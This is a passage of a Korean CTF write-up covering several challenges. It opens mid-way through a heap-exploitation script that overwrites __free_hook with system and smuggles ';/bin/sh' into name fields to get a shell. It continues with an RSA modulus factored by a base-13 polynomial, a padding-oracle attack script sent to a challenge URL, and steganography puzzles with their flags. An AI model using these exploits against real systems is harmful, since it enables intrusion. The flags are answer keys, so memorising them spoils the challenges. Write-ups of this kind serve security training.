<span class="n">edit</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span><span class="p">,</span><span class="n">name</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">)]</span>
<span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">age</span><span class="p">,</span><span class="n">height</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">age</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">height</span><span class="p">)]</span>
<span class="n">check</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">)]</span>
<span class="n">hidden</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">hidx</span><span class="p">,</span><span class="n">pidx</span><span class="p">,</span><span class="n">name</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">31337</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">hidx</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">pidx</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">create</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">'{}_{};/bin/sh'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="s">'The gift'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="s">'infected'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">print</span><span class="p">(</span><span class="n">cnt</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' was '</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'_'</span><span class="p">)</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'5'</span><span class="p">)</span>
            <span class="n">hidden</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span> <span class="c1">#free_hook-0x10
</span>            <span class="n">create</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x60</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">#system
</span>            <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'X'</span><span class="p">)</span>
            <span class="k">break</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h1 id="️-crypto">🖥️ CRYPTO</h1>

<h2 id="easy-rsa">Easy RSA</h2>

<hr />

<p><img src="/assets/bob/bob977.png" alt="/assets/bob/bob977.png" /></p>

<p>Easy polynomial factoring</p>

<ul>
  <li>문제에서는 공개키만 제공된다. 즉 이 문제에서는 N을 factorization하는 게 목표이다.</li>
  <li>code에서 N의 값을 13진법으로 살펴보라는 힌트가 주어졌다.</li>
  <li>N을 base 13으로 살펴보면 아래와 같다.</li>
</ul>

<p><code class="highlighter-rouge">1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2</code></p>

<ul>
  <li>이를 다항식으로 나타내면 아래와 같다.</li>
</ul>

<p><code class="highlighter-rouge">x^400 + x^399 + x^203 + 3*x^202 + 10*x^201 + 4*x^200 + x^199 + x^5 + 9*x^4 + 11*x^3 + 11*x^2 + 10*x + 2 (x=13)</code></p>

<ul>
  <li>sage에서 해당 다항식을 <code class="highlighter-rouge">poly.factor()</code>로 factorization하면 p와 q를 구할 수 있다.</li>
</ul>

<p><strong>Exploit Code</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">4069355261174518447044221465092549731956949577068389562886621536859114995157407396913103746675307806861475505196604075690189887011157213</span>
<span class="p">....:</span> <span class="mi">06579441204391802579988679325559464933524679569288946633797366876605906618330862289486089133036525973648043594211930902803789362401571187621</span>
<span class="p">....:</span> <span class="mi">75215559436614871795165204002781471609204034064252028413035000407848466271441883438192490960762478416146403426890827177153457241880068131862</span>
<span class="p">....:</span> <span class="mi">173969477923674349247844851493</span>
<span class="n">sage</span><span class="p">:</span> 
<span class="n">sage</span><span class="p">:</span> <span class="n">N</span><span class="p">.</span><span class="nb">str</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mi">13</span><span class="p">)</span>
<span class="s">'1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2'</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">poly</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">e</span> <span class="o">*</span> <span class="n">x</span><span class="o">^</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">N</span><span class="p">.</span><span class="n">digits</span><span class="p">(</span><span class="mi">13</span><span class="p">)))</span>
<span class="n">sage</span><span class="p">:</span> 
<span class="n">sage</span><span class="p">:</span> <span class="n">poly</span>
<span class="n">x</span><span class="o">^</span><span class="mi">400</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">399</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">203</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">202</span> <span class="o">+</span> <span class="mi">10</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">201</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">199</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">5</span> <span class="o">+</span> <span class="mi">9</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">11</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="mi">11</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">10</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">poly</span><span class="p">.</span><span class="n">factor</span><span class="p">()</span>
  <span class="o">***</span>   <span class="nb">Warning</span><span class="p">:</span> <span class="n">increasing</span> <span class="n">stack</span> <span class="n">size</span> <span class="n">to</span> <span class="mf">2000000.</span>
<span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">199</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">13</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">199</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">13</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">13</span> <span class="o">+</span> <span class="mi">1</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h2 id="boom-boom">Boom Boom</h2>

<hr />

<p><img src="/assets/bob/bob978.png" alt="/assets/bob/bob978.png" /></p>

<p>Oracle Padding Attack</p>

<p><img src="/assets/bob/bob979.png" alt="/assets/bob/bob979.png" /></p>

<p><strong>문제확인</strong></p>

<blockquote>
  <p>테러단체에서 폭탄테러가 있을 예정이라는 첩보를 입수했다….(생략)… 암호문을 복호화하고 암호 해제 비밀번호를 획득해라!</p>
</blockquote>

<ul>
  <li>문제에 접속하면 메시지와 함께 IV와 Ciphertext를 확인할 수 있다.</li>
  <li>페이지에 새로 접속할 때마다 새로운 IV와 Ciphertext를 출력해준다.</li>
</ul>

<p><strong>기능확인</strong></p>

<p><img src="/assets/bob/bob980.png" alt="/assets/bob/bob980.png" /></p>

<ul>
  <li><code class="highlighter-rouge">Module</code> 페이지에서는 <code class="highlighter-rouge">IV</code>와 <code class="highlighter-rouge">Ciphertext</code>를 입력할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob981.png" alt="/assets/bob/bob981.png" /></p>

<ul>
  <li><code class="highlighter-rouge">Flag</code> 페이지에서는 <code class="highlighter-rouge">Passcode</code>를 입력할 수 있다. 올바른 <code class="highlighter-rouge">Passcode</code>를 입력하면 <code class="highlighter-rouge">FlAG</code>를 출력한다.</li>
</ul>

<p><strong>분석</strong></p>

<ul>
  <li>Module 페이지에서는 총 3가지의 응답이 존재한다.</li>
</ul>

<p><img src="/assets/bob/bob982.png" alt="/assets/bob/bob982.png" /></p>

<p><strong>1) Invalid padding</strong></p>

<ul>
  <li>IV가 알맞지 않을 경우 발생(Padding error)</li>
</ul>

<p><img src="/assets/bob/bob983.png" alt="/assets/bob/bob983.png" /></p>

<p><img src="/assets/bob/bob984.png" alt="/assets/bob/bob984.png" /></p>

<p><strong>2) incoreect!</strong></p>

<ul>
  <li>Padding은 알맞게 채워진 경우</li>
</ul>

<p><img src="/assets/bob/bob985.png" alt="/assets/bob/bob985.png" /></p>

<p><strong>3) correct!</strong></p>

<ul>
  <li>IV와 Ciphertext 모두 알맞을 경우 발생</li>
</ul>

<p><strong>Oracle Padding Attack 개념</strong></p>

<ul>
  <li>취약점 설명
    <ul>
      <li>블록암호에서 사용되는 패딩이, 올바른지 올바르지 않은지에 따라 서버의 응답이 달라질 경우 이를 통해 공격을 수행 할 수 있다.</li>
    </ul>
  </li>
  <li>패딩이란?
    <ul>
      <li>블록 암호화해서 사용하는 것으로, 일정 단위로 블록을 자를때 마지막 블록에 앞 블록과 같은 길이로 만들어주기 위해 남는 곳은 패딩으로 채운다.</li>
    </ul>

    <p><img src="/assets/bob/bob986.png" alt="/assets/bob/bob986.png" /></p>

    <ul>
      <li>오라클 패딩의 경우, 5byte가 남았으면 0x05로 5byte를 채우고 2byte가 남았으면 0x02로 2byte를 채운다.</li>
      <li>만약 평문이 8byte일 경우 다음 블록을 모두 0x08로 8byte 채운다.</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/bob/bob987.png" alt="/assets/bob/bob987.png" /></p>

<ul>
  <li>암호화를 수행하는 과정은 위 그림과 같다.</li>
  <li>iv와 plain text를 xor 하여 Intermediary Value를 얻고 그 값을 3DES 암호화 방식을 거쳐 암호문으로 나온다.</li>
  <li>이후 그 암호문을 iv로 사용한다.</li>
  <li>즉 암호문은, IV+암호블럭1+암호블럭2로 이뤄진다.</li>
</ul>

<p><img src="/assets/bob/bob988.png" alt="/assets/bob/bob988.png" /></p>

<ul>
  <li>복호화 과정을 살펴보면 위 그림과 같다. 암호문을 3DES로 복호화 하여 Intermediary Value 값을 얻는다.</li>
  <li>이후 IV와 Intermediary Value를 XOR 하여 plain 값을 얻는다.</li>
</ul>

<p><img src="/assets/bob/bob989.png" alt="/assets/bob/bob989.png" /></p>

<ul>
  <li>IV와 Intermediary Value 값을 XOR 한 plain 블럭의 마지막 값(패딩 부분)이 0x01이 되는 IV 마지막 값 찾고, 0x01과 그 IV 마지막 값을 XOR 하면 Intermediary의 마지막 값을 알 수 있다.</li>
  <li>동일한 방식으로 0x01 부터 0x08까지 패딩을 가정하여 IV 값을 변경하며 서버로 요청을 수행하고, invalid 응답을 경우의 값을 iv로 두고 그때의 패딩 값과 xor 하여 intermediary value 값을 얻을 수 있고 intermediary value 값과 이미 알고있는 iv 값을 xor 하여 plain 값을 얻을 수 있다.</li>
</ul>

<p><strong>FlAG 획득!</strong></p>

<p>Exploit code</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">unquote</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">urllib3.util.retry</span> <span class="kn">import</span> <span class="n">Retry</span>
<span class="kn">from</span> <span class="nn">requests.adapters</span> <span class="kn">import</span> <span class="n">HTTPAdapter</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">OrderedDict</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="c1"># paload send
</span><span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">payload_iv</span><span class="p">,</span> <span class="n">payload_ciphertext</span><span class="p">):</span>
    <span class="c1"># variable initialization
</span>	<span class="n">url</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="n">params</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>

    <span class="c1"># URL setting
</span>	<span class="n">url</span> <span class="o">=</span> <span class="s">'http://1-star.kr/onestar/padding/module.php'</span>

    <span class="c1"># params setting
</span>	<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">'iv'</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload_iv</span><span class="p">),</span> <span class="s">'ciphertext'</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload_ciphertext</span><span class="p">)}</span>

    <span class="c1"># data setting
</span>	<span class="n">data</span> <span class="o">=</span> <span class="n">OrderedDict</span><span class="p">()</span>

    <span class="c1"># send packet
</span>	<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
	<span class="n">output</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
		<span class="n">output</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ch</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
	<span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>

<span class="c1"># hex
</span><span class="k">def</span> <span class="nf">hex_view</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="n">temp</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
		<span class="n">ret</span> <span class="o">+=</span> <span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">" "</span>
	<span class="k">return</span> <span class="n">ret</span>

<span class="n">iv</span><span class="o">=</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">unquote</span><span class="p">(</span><span class="s">"QjA2bGwxVTM%3D"</span><span class="p">))</span>
<span class="n">enc</span><span class="o">=</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">unquote</span><span class="p">(</span><span class="s">"EJA3gltQjV4%3D"</span><span class="p">))</span>
<span class="n">inter</span><span class="o">=</span><span class="s">b''</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="s">"I V =&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">hex_view</span><span class="p">(</span><span class="n">iv</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"ENC =&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">hex_view</span><span class="p">(</span><span class="n">enc</span><span class="p">)))</span>

<span class="c1">#make iv 1~len(iv)+1 
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"==========================================="</span><span class="p">)</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"i: "</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
	<span class="n">start</span> <span class="o">=</span> <span class="n">iv</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span><span class="o">-</span><span class="n">i</span><span class="p">]</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"start: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">start</span><span class="p">))</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"bytes([i]): "</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span><span class="p">]))</span>
	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xff</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
		<span class="k">print</span> <span class="p">(</span><span class="s">"j: "</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
		<span class="n">target</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">j</span><span class="p">])</span> <span class="o">+</span> <span class="n">xor</span><span class="p">(</span><span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span><span class="p">]))</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">send_payload</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">enc</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"target: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">target</span><span class="p">),</span> <span class="s">"=&gt;"</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
		<span class="c1">#print(hex_view(enc), "=&gt;", enc)
</span>		<span class="c1">#print(res)
</span>		<span class="k">if</span> <span class="s">'Invalid padding.'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
			<span class="k">break</span>
	<span class="n">inter</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span> <span class="o">^</span> <span class="n">j</span><span class="p">])</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"inter: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"inter: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>

<span class="c1"># inter xor iv =&gt; plain
</span><span class="n">inter</span> <span class="o">=</span> <span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">plain</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">inter</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"plain =&gt;"</span><span class="p">,</span> <span class="n">plain</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/bob/bob990.png" alt="/assets/bob/bob990.png" /></p>

<p><img src="/assets/bob/bob991.png" alt="/assets/bob/bob991.png" /></p>

<p><br /></p>

<p><br /></p>

<h1 id="️-misc">🖥️ MISC</h1>

<h2 id="gift">‘gif’t</h2>

<hr />

<p>문제에 대한 간단 설명</p>

<p><img src="/assets/bob/bob992.png" alt="/assets/bob/bob992.png" /></p>

<p>easy gif misc</p>

<ul>
  <li>문제의 그림에서 gif 그림을 보면 반짝이는 글자가 두 위치에서 반짝이는 것을 볼 수 있다. 이 그림이 문제 파일이다.</li>
</ul>

<p><img src="/assets/bob/bob993.png" alt="/assets/bob/bob993.png" /></p>

<ul>
  <li>이 gif 파일을 보면 16진수로 두 개의 글자가 왔다갔다 하는 것을 볼 수 있다.</li>
  <li>풀이하는 방법은 다양하게 있을 수 있기 때문에 하나하나 설명하지 않고, 파일 내부의 gif 구성을 보여주도록 하겠다.</li>
</ul>

<p><img src="/assets/bob/bob994.png" alt="/assets/bob/bob994.png" /></p>

<ul>
  <li>위와 같이 이미지를 볼 수 있는데, 이를 쭈욱 따라 작성하여 16진수를 ascii로 변환하게 되면 flag를 얻을 수 있는 간단한 문제다.</li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="hide-and-seek">Hide And Seek</h2>

<hr />

<p><img src="/assets/bob/bob995.png" alt="/assets/bob/bob995.png" /></p>

<p>이 문제에서는 stego.png 파일이 주어진다. 주어진 파일의 이름에 나타나듯 Stegography 문제의 일종으로 파악할 수 있다.
문제의 이미지를 잘 보면 아래 검은색 영역에 초록색 점들이 일부 나타나는 것을 확인할 수 있다. 이 문제는 이미지의 PIXEL을 구성하는 구분 값 R,G,B,A 중 A 값(투명도)을 활용하여 Flag를 추출하는 문제다.</p>

<ul>
  <li>주어진 이미지에서 A값(투명도)가 0xFF가 아닌 좌표들과 그 좌표에 해당하는 Pixel의 R,G,B,A 값들을 추출하면 아래와 같다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(x,y) =&gt; (r,g,b,a)
===============================
(1,416)	=&gt; (13,110,20,170)	=&gt; 'n'
(32,1172)	=&gt; (0,103,0,167)	=&gt; 'g'
(45,967)	=&gt; (15,105,24,163)	=&gt; 'i'
(113,1004)	=&gt; (17,71,28,172)	=&gt; 'G'
(160,1010)	=&gt; (17,66,26,174)	=&gt; 'B'
(161,704)	=&gt; (16,116,25,176)	=&gt; 't'
(192,110)	=&gt; (17,70,35,154)	=&gt; 'F'
(289,983)	=&gt; (17,98,28,152)	=&gt; 'b'
(301,736)	=&gt; (17,95,26,173)	=&gt; '_'
(312,1265)	=&gt; (0,103,0,157)	=&gt; 'g'
(359,887)	=&gt; (17,64,27,156)	=&gt; '@'
(395,600)	=&gt; (202,95,163,161)	=&gt; '_'
(415,45)	=&gt; (18,105,36,175)	=&gt; 'i'
(445,1106)	=&gt; (17,98,33,150)	=&gt; 'b'
(453,256)	=&gt; (202,105,163,169)	=&gt; 'i'
(456,783)	=&gt; (18,105,30,159)	=&gt; 'i'
(480,433)	=&gt; (31,95,57,171)	=&gt; '_'
(533,833)	=&gt; (20,110,34,166)	=&gt; 'n'
(557,90)	=&gt; (25,95,44,168)	=&gt; '_'
(643,1106)	=&gt; (17,111,33,151)	=&gt; 'o'
(668,818)	=&gt; (17,123,27,153)	=&gt; '{'
(674,677)	=&gt; (30,105,34,165)	=&gt; 'i'
(686,55)	=&gt; (18,100,36,164)	=&gt; 'd'
(801,54)	=&gt; (17,108,35,155)	=&gt; 'l'
(917,292)	=&gt; (18,36,35,177)	=&gt; '$'
(968,574)	=&gt; (15,72,25,162)	=&gt; 'H'
(970,1039)	=&gt; (0,125,0,178)	=&gt; '}'
(972,801)	=&gt; (17,95,29,158)	=&gt; '_'
(987,922)	=&gt; (17,115,26,160)	=&gt; 's'
</code></pre></div></div>

<ul>
  <li>위 값들에서 중요한 값들은 G에 해당하는 값들과 A에 해당하는 값들이다.</li>
  <li>G는 Flag의 각 문자들을 의미하며, A는 문자들의 Index를 의미한다.</li>
  <li>G 값들을 A의 값에 따라 나열하면 Flag를 추출할 수 있다.</li>
  <li><strong>Flag : bob{Fl@g_is_Hiding_in_G_Bit$}</strong></li>
</ul>

<p><br /></p>

<p><br /></p>

<h2 id="catcha">Catcha</h2>

<hr />

<p><img src="/assets/bob/bob996.png" alt="/assets/bob/bob996.png" /></p>

